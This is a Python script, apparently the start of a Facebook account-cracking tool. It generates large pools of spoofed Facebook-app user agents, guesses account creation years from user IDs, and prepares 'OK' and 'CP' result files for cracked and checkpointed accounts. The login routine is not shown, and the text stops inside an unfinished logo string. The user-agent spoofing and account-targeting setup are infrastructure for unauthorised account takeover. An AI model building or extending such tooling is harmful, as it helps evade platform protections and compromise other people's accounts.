#───────────────[ IMPORT SYSTEM ]─────────────────────────#
import os
import subprocess
import sys

#os.system('pip uninstall requests httpx beautifulsoup4 rich chardet urllib3 idna certifi -y;pip install requests httpx beautifulsoup4 rich chardet urllib3 idna certifi')
    	
try:
    import base64
    import datetime
    import json
    import math
    import platform
    import random
    import re
    import bs4
    import string
    import time
    import uuid
    import zlib
    import urllib3
    import requests
    import httpx
    from os import path
    from urllib.request import urlopen
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from concurrent.futures import ThreadPoolExecutor as tred
    from concurrent.futures import ThreadPoolExecutor as Tred
    from rich.table import Table as me
    from rich.console import Console as sol
    from rich.console import Group as gp
    from rich.panel import Panel as nel
    from rich.markdown import Markdown as mark
    from rich.columns import Columns as col
    from rich import pretty
    from rich.text import Text as tekz
    from time import localtime as lt
    from bs4 import BeautifulSoup as sop
except ImportError as e:
    pass
pretty.install()
CON=sol()
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';M1 = '\033[1;31m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________________| UA |__________________#
def ua():
    vivo = random.choice(["U3", "1002T", "C", "1605", "730", "A5", "A54", "a57", "A87",
    "C8818", "EGO", "E1", "E3", "E5", "X21", "X21i", "X2s", "X23",
    "iQOO", "X5Max5", "X5V", "X60t", "X6S", "X7", "X70", "Xplay", "Xshot",
    "Y01", "Y01A", "Y02", "Y02s", "V1", "V11", "V11s", "Y13T", "Nex",
    "S1", "S10", "S11", "S11t", "S12", "S13", "S15", "S15e", "S1PRO",
    "S20", "S21", "S31", "S5", "S6", "S6T", "S7", "S76", "S7e",
    "S7t", "S7w", "S9", "S9e", "T1", "T1x", "T2", "T2x", "E1",
    "U10", "U20", "X20", "X1w", "23x", "V77e", "Y613F", "Y628", "X3S",
    "Z1", "Z10", "Z1i", "Z1LITE", "Z1PRO", "Z1x", "Z34"])
    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/'+str(vivo)+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return ua
#───────────────[ USER AGENT ]─────────────────────────#

ugen2=[]
ugenfile=[]
cokbrut=[]
ses=requests.Session()
princp=[]


fbsv = f"{random.uniform(4, 12):.1f}"
density = random.choice(['2.0', '2.25', '2.75', '3.0', '3.25', '3.75', '4.0'])
width = random.randint(720, 1440)
height = random.randint(1280, 3200)
fbav = f'{random.randint(280, 500)}.0.0.{random.randint(10,50)}.{random.randint(20,160)}'
fbbv = str(random.randint(10000000, 409614015))
chrm = f"{random.randint(58, 126)}.0.{random.randint(0, 5000)}.{random.randint(20, 170)}"
fbcr = random.choice([
    'Telenor', 'Fido', 'MOVO AFRICA', 'UFONE-PAKTel', 'Zong', 'Jazz', 'SCO', 'Jio', 'Vodafone', 
    'Airtel', 'BSNL', 'MTNL', 'Grameenphone', 'Robi', 'Banglalink', 'Teletalk', 'Telkomsel', 'Indosat Ooredoo', 
    'Axiata', 'Tri', 'Smartfren', 'China Mobile', 'Unicom', 'Telecom', 'Satcom', 'Docomo', 'Rakuten', 'IIJmio', 'Orange', 
    'Verizon', 'AT&T', 'T-Mobile', 'Sprint', 'Telefonica', 'EE', 'Three'
])

#===================[ MOZILA USER AGENT ]=====================#
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 12; vivo V21 5G Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/vivo V21 5G;FBMD/vivo;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 13; vivo X60 Pro Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/vivo X60 Pro;FBMD/vivo;FBSN/Android;FBSV/13;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 12; realme 8 Pro Build/SKQ1.210817.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/realme 8 Pro;FBMD/realme;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 13; realme GT 2 Pro Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/realme GT 2 Pro;FBMD/realme;FBSN/Android;FBSV/13;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 12; Tecno Camon 17 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Tecno Camon 17;FBMD/Tecno;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 13; Tecno Phantom X Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Tecno Phantom X;FBMD/Tecno;FBSN/Android;FBSV/13;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 11; Samsung Galaxy S21 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Samsung Galaxy S21;FBMD/Samsung;FBSN/Android;FBSV/11;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1440,height=3200};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 11; Xiaomi Mi 11 Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = '[FBAN/FB4A;FBAV/310.0.0.42.119;FBBV/255406824;FBDV/Xiaomi Mi 11;FBMD/Xiaomi;FBSN/Android;FBSV/11;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1440,height=3200};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 11; OnePlus 9 Pro Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/OnePlus 9 Pro;FBMD/OnePlus;FBSN/Android;FBSV/11;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1440,height=3216};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Mozilla/5.0 (Linux; Android 12; Motorola Edge 30 Pro Build/S1DA.220115.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrm} Mobile Safari/537.36 '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Motorola Edge 30 Pro;FBMD/Motorola;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
#===================[ DALVIK USER AGENT ]=====================#
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Android 13; Samsung Galaxy S22 Build/RP1A.200720.012) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Samsung Galaxy S22;FBMD/Samsung;FBSN/Android;FBSV/13;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Android 12; Samsung Galaxy A52 Build/PKQ1.190616.001) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Samsung Galaxy A52;FBMD/Samsung;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Android 13; Redmi K50 Pro Build/RP1A.200720.012) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Redmi K50 Pro;FBMD/Xiaomi;FBSN/Android;FBSV/13;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 11 Pro Build/PKQ1.190616.001) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Redmi Note 11 Pro;FBMD/Xiaomi;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Android 13; Infinix Note 12 Pro Build/RP1A.200720.012) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Infinix Note 12 Pro;FBMD/Infinix;FBSN/Android;FBSV/13;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Android 12; Infinix Zero X Pro Build/PKQ1.190616.001) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Infinix Zero X Pro;FBMD/Infinix;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Windows Phone 10; Lumia 950 XL Build/10.0.10586.0) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Lumia 950 XL;FBMD/Microsoft;FBSN/Windows;FBSV/10;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1440,height=2560};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Android 12; Soho X1 Build/RP1A.200720.012) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Soho X1;FBMD/Soho;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; iOS 17; iPhone 15 Pro Build/17.0.0) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/iPhone 15 Pro;FBMD/iPhone;FBSN/iOS;FBSV/17;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=2.0,width=1170,height=2532};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
for xd in range(10000):
    mainx = f'Dalvik/2.1.0 (Linux; U; Android 14; Google Pixel 8 Pro Build/UPB1.220609.001) '
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Google Pixel 8 Pro;FBMD/Google;FBSN/Android;FBSV/14;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1440,height=3120};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = mainx+sex+loll
    ugenfile.append(ex)
    
#===================[ FACEBOOK USER AGENT ]=====================#
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Nokia 7.2;FBMD/Nokia;FBSN/Android;FBSV/9;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2280};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Samsung Galaxy S21;FBMD/Samsung;FBSN/Android;FBSV/11;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1440,height=3200};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/iPhone 13 Pro;FBMD/iPhone;FBSN/iOS;FBSV/15;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=2.0,width=1170,height=2532};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Nothing Phone 1;FBMD/Nothing;FBSN/Android;FBSV/12;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Sony Xperia 5 III;FBMD/Sony;FBSN/Android;FBSV/11;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2520};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Oppo Find X3 Pro;FBMD/Oppo;FBSN/Android;FBSV/11;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1440,height=3216};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/iPhone 12;FBMD/iPhone;FBSN/iOS;FBSV/14;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=2.0,width=1170,height=2532};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Vivo V19;FBMD/Vivo;FBSN/Android;FBSV/10;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2400};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/Vivo X60 Pro;FBMD/Vivo;FBSN/Android;FBSV/11;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=3.0,width=1080,height=2376};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
    
for xd in range(20000):
    sex = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
    loll = 'FBDV/iPhone 11;FBMD/iPhone;FBSN/iOS;FBSV/13;FBOP/1;FBCA/arm64-v8a;FBLC/en_US;FBPN/com.facebook.katana;FBDM/{density=2.0,width=828,height=1792};FBDT/mobile;FBCE/4;FBLR/0;'+f'FBCR/{fbcr};]'
    ex = sex+loll
    ugenfile.append(ex)
#───────────────[ INDICATION ]─────────────────────────#
id,id2,loop,oki,cpi,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
loop=0
oks=[]
cps=[]

def sanjida(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']:
            samira = '  ✓ 2007/8'
        elif uid[:9] in ['100000000']:
            samira = '  ✓ 2008/9'
        elif uid[:8] in ['10000000']:
            samira = '  ✓ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
            samira = '  ✓ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:
            samira = '  ✓ 2010'
        elif uid[:6] in ['100001']:
            samira = '  ✓ 2010/2011'
        elif uid[:6] in ['100002','100003']:
            samira = '  ✓ 2011/2012'
        elif uid[:6] in ['100004']:
            samira = '  ✓ 2012/2013'
        elif uid[:6] in ['100005','100006']:
            samira = '  ✓ 2013/2014'
        elif uid[:6] in ['100007','100008']:
            samira = '  ✓ 2014/2015'
        elif uid[:6] in ['100009']:
            samira = '  ✓ 2015'
        elif uid[:5] in ['10001']:
            samira = '  ✓ 2015/2016'
        elif uid[:5] in ['10002']:
            samira = '  ✓ 2016/2017'
        elif uid[:5] in ['10003']:
            samira = '  ✓ 2018/2019'
        elif uid[:5] in ['10004']:
            samira = '  ✓ 2019/2020'
        elif uid[:5] in ['10005']:
            samira = '  ✓ 2020'
        elif uid[:5] in ['10006','10007','']:
            samira = '  ✓ 2021'
        elif uid[:5] in ['10008']:
            samira = '  ✓ 2022'
        elif uid[:5] in ['10009']:
            samira = '  ✓ 2023'
        else:
            samira='  ✓ Year Not Found'
    elif len(uid) in [9,10]:
        samira = '  ✓ 2008/2009'
    elif len(uid)==8:
        samira = '  ✓ 2007/2008'
    elif len(uid)==7:
        samira = '  ✓ 2006/2007'
    else:
        samira='  ✓ Year Not Found'
    return samira

#───────────────[ COLOR-LIST]─────────────────────────#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###───────────────[ ANSII COLOR STYLE]─────────────────────────###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###───────────────[ RICH COLOR STYLE ]─────────────────────────###
 
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

#───────────────[ CONVERTER-BULAN ]─────────────────────────#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.005) 

#old ua def[👇]
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#------------------[ MACHINE-SUPPORT ]---------------# 
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
RED = '\033[38;5;196m'
white = '\033[1;37m'
GREEN = '\033[1;32m' 
GREENx = '\033[38;5;196m' 
YELLOW = '\033[38;5;51m'
BLUE = '\033[38;5;21m'
mitw = '\033[1;30m'
xox = '\033[1;32m'
pink = '\033[1;35m'
G3 = '\x1b[38;5;48m'
version = "1.5"
logo =f'''
\033[1;93m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;93m

{GREEN}  ███████{RED}╗{pink}██{white}╗  {pink}██{white}╗ {BLUE}█████{GREEN}╗   {white}   ██{YELLOW}╗ {GREENx}██████{GREEN}╗ {xox}███{mitw}╗   {xox}██{mitw}╗
 {GREEN} ██{RED}╔════╝{pink}██{white}║ {pink} ██{white}║{BLUE}██{GREEN}╔══{BLUE}██{GREEN}╗  {white}   ██{YELLOW}║{GREENx}██{GREEN}╔═══{GREENx}██{GREEN}╗{xox}████{mitw}╗  {xox}██{mitw}║
 {GREEN} ███████{RED}╗{pink}███████{white}║{BLUE}███████{GREEN}║  {white}   ██{YELLOW}║{GREENx}██{GREEN}║   {GREENx}██{GREEN}║{xox}██{mitw}╔{xox}██{mitw}╗ {xox}██{mitw}║
{GREEN}  {RED}╚════{GREEN}██{RED}║{pink}██{white}╔══{pink}██{white}║{BLUE}██{GREEN}╔══{BLUE}██{GREEN}║{white}██   ██{YELLOW}║{GREENx}██{GREEN}║   {GREENx}██{GREEN}║{xox}██{mitw}║╚{xox}██{mitw}╗{xox}██{mitw}║
 {GREEN} ███████{RED}║{pink}██{white}║  {pink}██{white}║{BLUE}██{GREEN}║ {BLUE} ██{GREEN}║{YELLOW}╚{white}█████{YELLOW}╔╝{GREEN}╚{GREENx}██████{GREEN}╔╝{xox}██{mitw}║ ╚{xox}████{mitw}║
{RED}  ╚══════╝{white}{white}╚═╝  ╚═╝{GREEN}╚═╝  ╚═╝ {YELLOW}╚════╝  {GREEN}╚═════╝ {mitw}╚═╝  ╚═══╝
\033[1;37m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
